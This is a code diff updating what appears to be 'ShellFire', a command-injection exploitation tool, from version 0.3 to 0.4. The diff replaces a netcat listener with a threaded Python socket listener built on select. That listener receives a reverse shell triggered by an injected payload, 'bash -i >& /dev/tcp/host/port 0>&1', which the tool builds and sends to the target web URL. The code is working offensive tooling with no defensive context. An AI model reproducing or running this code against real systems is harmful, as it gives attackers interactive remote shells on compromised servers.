@@ -9,6 +9,7 @@ import os
 import re
 import readline
 import requests
+import select
 import socket
 import sys
 import threading
@@ -17,7 +18,7 @@ import time
 ############################################################
 ## Configs
 
-version = "0.3"
+version = "0.4"
 url = "http://www.example.com?"
 history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
 post_data = {}
@@ -159,7 +160,9 @@ def http_server(port):
   sys.stdout.write("[*] HTTP Server stopped\n")
 
 def rev_shell(addr, port):
+  port = int(port)
   global revshell_running
+  revshell_running = True
   conn = None
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -168,17 +171,26 @@ def rev_shell(addr, port):
   conn, client_address = sock.accept()
 
   while True:
-    try:
-      response = raw_input("?? ")
-      conn.sendall(response)
-      request = conn.recv(1024)
-    except socket.error as err:
-      print (err, type(err))
-    except socket.timeout:
-      sys.stdout.write("[!] Socket timeout\n")
-      pass
+    socket_list = [conn, sys.stdin]
+    read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
+
+    for s in read_sockets:
+      if s == conn:
+        data = s.recv(4096)
+        if not data:
+          sys.stdout.write("[!] Connection closed.\n")
+          revshell_running = False
+          return
+        else:
+          sys.stdout.write(data)
+          sys.stdout.flush()
+      else:
+        msg = sys.stdin.readline()
+        conn.send(msg)
+
   conn.close()
   revshell_running = False
+  return
 
 
 ############################################################
@@ -193,6 +205,8 @@ args = parser.parse_args()
 
 sys.stdout.write("[*] ShellFire v" + version + "\n")
 sys.stdout.write("[*] Type '.help' to see available commands\n")
+if args.debug == True:
+  sys.stdout.write("[*] Debug mode enabled.\n")
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
@@ -341,15 +355,15 @@ while True:
     host = cmd[1]
     port = cmd[2]
     input = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
-    ## I was having trouble setting up a listener in python that works
-    ## for now, call netcat, but we need to fix this later
-    os.system("nc -vl " + port)
-    #s = threading.Thread(target=rev_shell, args=(cmd[1],int(cmd[2])))
-    #s.start()
-    #revshell_running = True
-    ## make sure the thread is init before proceeding
-    #time.sleep(1)
-    #exec_cmd = True
+
+    # open our reverse shell in a new thread
+    s = threading.Thread(target=rev_shell, args=(host, port))
+    s.start()
+
+    # make sure the thread is init before proceeding
+    time.sleep(1)
+
+    exec_cmd = True
   elif cmd[0] == ".url":
     if len(cmd) > 1:
       url = input[len(cmd[0])+1:]
